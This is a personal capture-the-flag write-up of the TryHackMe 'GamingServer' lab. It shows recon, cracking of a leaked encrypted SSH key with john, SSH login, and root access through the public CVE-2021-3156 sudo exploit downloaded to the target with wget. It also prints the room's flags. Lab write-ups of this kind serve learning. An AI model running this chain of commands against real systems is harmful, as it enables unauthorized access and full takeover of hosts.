---
title: "GamingServer"
date: 2025-02-09
slug: gamingserver
tags: [tryhackme, linux, web, privesc]
difficulty: Easy
---
IP = 10.10.67.123

**enumeration**

```
❯ nmap -sCV 10.10.67.123

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

SSH and HTTP are open 


```
❯ gobuster dir -u http://10.10.67.123 -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js,txt

/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2762]
/.php                 (Status: 403) [Size: 277]
/about.php            (Status: 200) [Size: 2213]
/about.html           (Status: 200) [Size: 1435]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.67.123/uploads/]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 313] [--> http://10.10.67.123/secret/]
/myths.html           (Status: 200) [Size: 3067]


```

in /robots.txt we get so /uploads might be the clue 
```
user-agent: *
Allow: /
/uploads/
```

in /uploads - 
![[Pasted image 20250124102303.png]]




there is a dictionary in /uploads and a ssh service running so we can try to brute force the SSH using the dict 

but we dont know the username 
but the other file in /uploads has been written by **Mentor** -- but that returned nothing 

we also have a image 
- i tried exiftool to extract the metadata but found nothing interesting 
- can try using other stegnography methods 

in /secret we found the SSH key 
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```
copy pasting this output to key on our directory 

**Exploitation**



IP changed = 10.10.121.79


```
❯ run/ssh2john.py ../thm/key > ../thm/hash
❯ run/john ../thm/hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 3DES/AES 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2025-02-09 21:10) 0g/s 211880p/s 211880c/s 211880C/s Key../thm/key1900..Kthm1900
Proceeding with wordlist:run/password.lst
Enabling duplicate candidate password suppressor
letmein          (../thm/key)    
```

**letmein** is the password


inspecting the website html on index page we got the comment  
` john, please add some actual content to the site! lorem ipsum is horrible to look at. `

try accessing the server using john and letmein password using the key 


```
❯ ssh john@10.10.121.79 -i ../thm/key
Enter passphrase for key '../thm/key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb  9 15:57:09 UTC 2025

  System load:  0.0               Processes:           97
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.121.79
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```


```
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```


**PrivEsc**

```
john@exploitable:/$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
this version is outdated so we might find some vulnerabilities for this 

https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31


using the exploit -- 
https://github.com/worawit/CVE-2021-3156

```
❯ git clone https://github.com/worawit/CVE-2021-3156
Cloning into 'CVE-2021-3156'...
remote: Enumerating objects: 86, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 86 (delta 16), reused 11 (delta 11), pack-reused 68 (from 1)
Receiving objects: 100% (86/86), 41.76 KiB | 359.00 KiB/s, done.
Resolving deltas: 100% (46/46), done.
❯ ls
CVE-2021-3156 

❯ tar -cf exploit.tar CVE-2021-3156/*

❯ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```




```
john@exploitable:/$ cd tmp
john@exploitable:/tmp$ wget http://10.17.26.44:8000/exploit.tar
--2025-02-09 17:31:21--  http://10.17.26.44:8000/exploit.tar
Connecting to 10.17.26.44:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112640 (110K) [application/x-tar]
Saving to: ‘exploit.tar’

exploit.tar                  100%[=============================================>] 110.00K   220KB/s    in 0.5s    

2025-02-09 17:31:22 (220 KB/s) - ‘exploit.tar’ saved [112640/112640]
john@exploitable:/tmp$ ls
exploit.tar
linpeas.sh
systemd-private-9b91caa25e654bdabb95275b3d7e4f3b-apache2.service-qyTsuI
systemd-private-9b91caa25e654bdabb95275b3d7e4f3b-systemd-resolved.service-osDukb
systemd-private-9b91caa25e654bdabb95275b3d7e4f3b-systemd-timesyncd.service-Eb6dYM
john@exploitable:/tmp$ tar -xf exploit.tar 
john@exploitable:/tmp$ ls
CVE-2021-3156  systemd-private-9b91caa25e654bdabb95275b3d7e4f3b-apache2.service-qyTsuI
exploit.tar    systemd-private-9b91caa25e654bdabb95275b3d7e4f3b-systemd-resolved.service-osDukb
linpeas.sh     systemd-private-9b91caa25e654bdabb95275b3d7e4f3b-systemd-timesyncd.service-Eb6dYM
john@exploitable:/tmp$ cd CVE-2021-3156/
john@exploitable:/tmp/CVE-2021-3156$ ls
asm                         exploit_nss_d9.py      exploit_nss_u14.py        exploit_userspec.py  README.md
exploit_cent7_userspec.py   exploit_nss_manual.py  exploit_nss_u16.py        gdb
exploit_defaults_mailer.py  exploit_nss.py         exploit_timestamp_race.c  LICENSE
john@exploitable:/tmp/CVE-2021-3156$ ./exploit_nss.py 
# whoami
root
# cat /root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc

```

user flag -  a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

root flag - 2e337b8c9f3aff0c2b3e8d4e6a7c88fc

---

**Learnings for me** -- 
- checking all the comments on html pages for clues 
- I know how to use exploits now consider some time on learning their workings 
- get to know more privEsc techniques
